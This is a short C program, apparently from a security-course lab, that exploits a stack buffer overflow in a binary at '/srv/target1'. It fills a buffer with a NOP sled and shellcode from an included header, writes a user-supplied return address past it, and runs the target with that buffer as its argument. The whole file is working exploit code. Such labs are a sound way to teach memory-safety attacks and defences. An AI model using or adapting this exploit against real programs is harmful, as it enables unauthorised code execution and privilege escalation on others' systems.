#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <nop_length> <eip_address>\n", argv[0]);
        return 1;
    }

    int nop_length = atoi(argv[1]);
    uint32_t eip_address = strtoul(argv[2], NULL, 16);

    char *args[3];
    char *env[1];

    char payload[1000];
    memset(payload, 0x90, nop_length);
    memcpy(payload + nop_length, shellcode, strlen(shellcode));
    *(uint32_t *)(payload + nop_length + strlen(shellcode) + 44 - 4) = eip_address;

    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}